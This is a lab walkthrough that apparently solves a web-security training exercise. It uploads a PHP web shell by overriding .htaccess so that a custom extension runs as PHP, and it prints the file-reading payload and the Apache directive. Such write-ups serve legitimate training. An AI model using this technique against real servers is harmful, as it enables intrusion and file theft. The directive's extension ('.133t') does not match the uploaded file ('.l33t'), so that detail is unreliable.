# Web shell upload via extension blacklist bypass
* This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
	* To Solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using th button provided in the lab banner.
	* You can log in your own account using the following credentials: _wiener:peter_
### 1. Make a PHP payload to exfilterate the target file
* The file is saved as "file.php"
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### 2. Try to uplaod the malicious PHP file
* Login as wiener and a file upload panel is found on "My account".

![86](https://user-images.githubusercontent.com/53956303/152077758-52fefe38-be4d-4b9b-a3b5-4ab3df5a32e3.png)
* When upload the created malicious PHP file, an error message is given

![97](https://user-images.githubusercontent.com/53956303/152247408-e91e5143-9cad-4fe4-8bf6-7ccd9751c1f4.png)
* Also the response shows that this server is running _Apache 2.4.29_

![98](https://user-images.githubusercontent.com/53956303/152247737-5835db93-80a2-400c-880b-c2042bcb3755.png)
### 3. Send the _POST /my-account/avatar_ request to Repater to modify the configuration file _.htaccess_
1. Change the value of the _filename_ parameter to `.htaccess`
2. Change the value of the _Content-Type_ header to `text/plain` 
3. Replacethe contents with the following Apache directive
```apache
AddType application/x-httpd-php .133t
```
* This maps an arbitrary extension (.133t) to the executable MIME type _application/x-httpd-php_. As the server uses the _mod_php_ module, it knows how to handle this already.

![99](https://user-images.githubusercontent.com/53956303/152248516-9f0c1b21-592d-417a-a20e-6f9248744b9f.png)
* Then, send the request. As a result, the response gives a successful upload message.

![100](https://user-images.githubusercontent.com/53956303/152248638-ef16e905-7bdc-48b0-af1a-ac33fa2231cc.png)
### 4. Use the back arrow in Burp Repeater to return to the original request for uploading the PHP exploit
* Change the value of the _filename_ parameter to `file.l33t`, and send the request
	* As a result, the file is uploaded is successfully.

![101](https://user-images.githubusercontent.com/53956303/152249026-841276e0-af1e-48dd-a37f-8ceddcd9b4b1.png)

### 5. Trigger the exploit
* Use a browser to navigate the uploaded file to execute the exploit.
```http
https://ac031ff41f4c427cc0ea5cc300e20098.web-security-academy.net/files/avatars/file.l33t
```
* As a result, the malicious PHP file (file.l33t) is executed bacuse of the malicious _.htaccess_, and the Key is given

![102](https://user-images.githubusercontent.com/53956303/152250154-bb1bf773-87c0-47e1-b8cc-1a7d5f8f9e2d.png)
* By the submitting the key, the lab is solved

![103](https://user-images.githubusercontent.com/53956303/152250267-39315ff4-c57f-45fa-8738-d2a6c05b7145.png)
